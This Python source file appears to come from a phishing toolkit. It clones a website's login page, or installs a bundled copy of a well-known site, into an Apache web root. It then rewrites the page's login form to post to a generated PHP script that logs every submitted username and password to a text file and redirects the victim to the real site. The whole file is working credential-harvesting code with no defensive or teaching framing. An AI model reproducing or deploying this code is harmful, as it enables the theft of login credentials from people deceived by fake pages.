import subprocess
from pathlib import Path
import urllib.parse
from bs4 import BeautifulSoup
from sources import Sources
import time
import os
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET


class PhishCreate:
    def __init__(self):
        self.main_url = None
        self.login_data_file_path = ""


    def setup_phish_page(self):
            print(f"{GREEN}\n[+] Phish Page Creation SETTINGS::::: \n")
            print("--------------------------------------------------------------------------------")
            print("0. Phish Page of Login Page of Website using URL of login page")
            print("1. Phish Page of Famous Websites (URL not required)")
            print("2. Want to place your own Phish Page files in /var/www/html")
            print("3. Back.. \n")
            option = input(f"Select the option by typing corresponding index number: 0-4 --> {RESET}")
            if option == "0":
                self.phish_page_by_url()
            elif option == "1":
                self.phish_page_of_famous_website()
            elif option == "2":
                self.own_phish_page_configure()


    def phish_page_by_url(self):
        try:
            os.system("clear")
            print(f"{BLUE}[!] Make sure you are connected to internet to Clone wesbite using url!!!! {RESET}")
            url = input(f"\n{GREEN} Please enter url of login page of website here:--> {RESET}")
            website_name = input(f"\n{GREEN} Please enter name for website to be saved in your computer. It could be random. :--> {RESET}")
            files_location = f'/var/www/html/'
            while True:
                output = self.clone_website(url,files_location,website_name)
                if output == "ok":
                    break
                else:
                    os.system("clear")
                    url = input("[!] Could not clone to provided url. It could be not connected to internet or wrong url. Type the correct url again e.g 'https://example.com' -->")
            urls = self.homepage_website_url(website_name)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
            self.configure_login_files()
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Phish Page:>> {e}{RESET}")




    def phish_page_of_famous_website(self):
        try:
            sites = Sources().list_directory(f"{os.getcwd()}/src/sites/")
            os.system("clear")
            print("[++] Following Famous sites are available for Captive Portal:::::")
            for i in range(0, len(sites), 3):
                line = '\t\t\t '.join(f"{j}: {sites[j]}" for j in range(i, min(i + 3, len(sites))))
                print(line)

            select_website = int(input("[++] Following websites are available for captive portal. Select one by typing corresponding number: ---> "))
            website = sites[select_website]
            Sources().copy_directory(f"{os.getcwd()}/src/sites/{website}","/var/www/html/")
            urls = self.homepage_website_url(website)
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
            self.configure_login_files()
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")




    def own_phish_page_configure(self):
        try:
            os.system("clear")
            print(f"\n {RED}[-][-]In order to configure your own website portal, Place all websites file in folder and Paste that folder in '/var/www/html' before running this program .{RESET}\n")
            check = input("[+] Press any key after completing above step --> ")
            result = Sources().list_directory('/var/www/html')
            website = int(input(f"{BLUE}[+]Your apache websites directory contain following website. Select the website by typing corresponding number to create captive using that directory: -->{RESET}"))
            urls = self.homepage_website_url(result[website])
            self.configuring_redirecting_index_file(urls)
            self.configuring_main_index_file(self.main_url)
            self.configure_login_files()
        except Exception as e:
            print(f"{RED}[--] Following Error Occur During Configuring Captive Portal:>> {e}{RESET}")


    def configuring_redirecting_index_file(self,urls):
        os.system("clear")
        if len(urls) == 1:
            self.main_url = f"/var/www/html{urls[0]}"
            url = urllib.parse.quote(urls[0], safe='/')
        else:
            i = 0
            for url in urls:
                print(f"{i}. {url}")
                i+=1
            url_select = input("Following Index files are found for website select the correct one that contain urls: ")
            if url_select == "":
                url_select = 0
            else:
                url_select = int(url_select)
            url = urllib.parse.quote(urls[url_select], safe='/')
            self.main_url = f"/var/www/html{urls[url_select]}"
        data = f'<!DOCTYPE html>\n<html lang="en">\n<head>\n\t<meta charset="UTF-8">\n\t<meta http-equiv="refresh" content="0; URL={url}">\n</head>\n<body>\n</body>\n</html>'
        html_file_path = "/var/www/html/index.html"
        Sources().create_file(html_file_path)

        try:
            with open(html_file_path, 'w') as f:
                f.write(data)
            print("[+]File " + html_file_path + " created successfully.")
        except IOError:
            print("Error: could not create file " + html_file_path)


    def configure_login_files(self):
        path_list = self.main_url.split("/")[:-1]
        path = "/".join(path_list)
        php_file_path = path + "/save_login.php"
        login_file_path = path + "/login_data.txt"
        self.login_data_file_path = login_file_path
        original_website_url = input(f"\n\n{GREEN}[?] Provide the link for original website to which you want to redirect user after providing login details --> {RESET}")
        if original_website_url == "":
            original_website_url = self.main_url.split("/")[-1]
        data = "<?php\n$log_file = 'login_data.txt';\nif ($_SERVER['REQUEST_METHOD'] == 'POST') {\n$login_data = $_POST;\n$data_string = date('Y-m-d H:i:s') . ' - ' . json_encode($login_data) . PHP_EOL;\nif (file_put_contents($log_file, $data_string, FILE_APPEND | LOCK_EX) === false) {\nheader('Location: " + self.main_url.split("/")[-1] + "');\nexit();\n} else {\nheader('Location: " + original_website_url + "');\nexit();\n}\n}\n?>"
        try:
            with open(php_file_path, 'w') as f:
                f.write(data)
            print("[+]File " + php_file_path + " created successfully.")
        except IOError:
            print("Error: could not create file " + php_file_path)
        
        Sources().create_file(login_file_path)
        result = subprocess.run(f"chown www-data:www-data {login_file_path}", shell=True, capture_output=True, text=True)
        print(result.stderr)
        result = subprocess.run(f"chmod 664 {login_file_path}", shell=True, capture_output=True, text=True)
        print(result.stderr)
        

    def configuring_main_index_file(self,file_path):
        with open(file_path, 'r', encoding='utf-8') as file:
            html_content = file.read()
            
        soup = BeautifulSoup(html_content, 'html.parser')
            
        form = soup.find('form')
        if form:
            form['action'] = "save_login.php"
            form['method'] = "post"
            
        with open(file_path, 'w', encoding='utf-8') as file:
            file.write(str(soup))



    def clone_website(self,website,path,website_name):
        print(f"{GREEN}\n[+] Cloning login page::::{RESET}")
        result = subprocess.run(f"wget -m -k -p -E '{website}' -P '{path}{website_name}' --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3' --no-check-certificate", shell=True, capture_output=True, text=True)
        if "failed: Connection refused." in result.stderr or "failed: No route to host." in result.stderr or "failed: Name or service not known." in result.stderr and "Converted links in 0 files" in result.stderr:
            time.sleep(1)
            return ""
        elif website_name in Sources().list_directory(path):
            time.sleep(1)
            print(f"{GREEN}\n[+][+] Website is cloned Succussfully in folder name {website_name} !!!!!!!{RESET}")
            return "ok"       
        else:
            time.sleep(1)
            print(f"{RED}\n[-][-] Due to some issues, website could not cloned successfully. Try Again by starting from beginning ---- {RESET}")
            return ""

    def homepage_website_url(self,website):
        url = f"/var/www/html/{website}"
        print(url)
        paths = []
        for path in Path(url).rglob('*.html*'):
            path = str(path).split("/html")[1]
            paths.append(path)
        return paths


    